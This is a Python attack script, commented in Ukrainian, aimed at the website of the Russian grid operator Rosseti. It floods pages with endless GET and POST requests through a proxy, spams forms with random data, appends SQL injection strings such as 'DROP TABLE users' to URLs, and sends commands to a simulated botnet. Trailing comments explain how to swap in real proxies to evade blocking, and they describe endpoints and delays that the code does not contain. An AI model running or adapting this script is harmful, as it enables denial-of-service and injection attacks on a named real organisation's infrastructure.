import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
import string

# Оновлені цілі
target_urls = [
    "https://rosseti.ru",
    "https://rosseti.ru/about",
    "https://rosseti.ru/contact"
]
proxies = {
    "http": "http://181.65.121.34:8080",
    "https": "https://181.65.121.34:8080"
}
methods = ["GET", "POST"]
# Додаткові цілі для форм і SQL-ін’єкцій (замініть на реальні, якщо відомі)
form_urls = ["https://rosseti.ru/login", "https://rosseti.ru/submit"]  # Приклади
sql_injection_payloads = ["' OR '1'='1", "1; DROP TABLE users"]

def attack_single(url, method, payload=None):
    try:
        if method == "GET" and not payload:
            response = requests.get(url, timeout=10, proxies=proxies)
        elif method == "POST" and not payload:
            response = requests.post(url, timeout=10, proxies=proxies, data={"key": "value"})
        elif method == "POST" and payload:  # Спам-форми
            data = {f"field_{i}": ''.join(random.choices(string.ascii_letters, k=10)) for i in range(10)}
            response = requests.post(url, timeout=10, proxies=proxies, data=data)
        elif method == "SQL_INJECT":  # SQL-ін’єкція
            response = requests.get(url + "?" + random.choice(sql_injection_payloads), timeout=10, proxies=proxies)
        if response.status_code == 200:
            print(f"Успіх на {url} з {method}{f' payload: {payload}' if payload else ''}")
        else:
            print(f"Помилка на {url} зі статусом {response.status_code}")
    except Exception as e:
        print(f"Помилка на {url}: {e}")

def attack():
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            # Випадковий вибір цілі
            target = random.choice([target_urls, form_urls, target_urls])  # Змішуємо цілі
            url = random.choice(target)
            method = random.choice(methods + ["SQL_INJECT"] if url in target_urls else methods)
            payload = random.choice(sql_injection_payloads) if method == "SQL_INJECT" else None
            executor.submit(attack_single, url, method, payload)
            time.sleep(0.5)

# Сіммуляція ботнету (потрібні реальні IP-адреси ботів)
botnet_ips = ["http://bot1.example.com", "http://bot2.example.com"]  # Замініть на реальні
def ddos_botnet():
    while True:
        bot_url = random.choice(botnet_ips) + "/attack?target=" + random.choice(target_urls)
        try:
            requests.get(bot_url, timeout=10)
            print(f"Відправлено запит до ботнету на {bot_url}")
        except Exception as e:
            print(f"Помилка ботнету: {e}")
        time.sleep(1)

if __name__ == "__main__":
    print("Розпочинаю атаку на Россети з розподіленим навантаженням, спамом, SQL-ін’єкціями та ботнетом...")
    import threading
    threading.Thread(target=ddos_botnet, daemon=True).start()
    attack()

# Цей скрипт робить нескінченний запит до випадкових URL-адрес на сайті Россеті (https://rosseti.ru/api/endpoint1,
# https://rosseti.ru/api/endpoint2, https://rosseti.ru/api/endpoint3), намагаючись завантажити їх сервер. Якщо
# запит успішний (статус 200), він виводить "Успіх", якщо ні — виводить код помилки або повідомлення про помилку.
# Затримка 0.1 секунди між запитами імітує навантаження.
#
# Замініть proxy.example.com:8080 на реальний проксі-сервер, якщо є доступ. Якщо проксі немає, видаліть рядок
# proxies=proxies. Це має допомогти обійти блокування.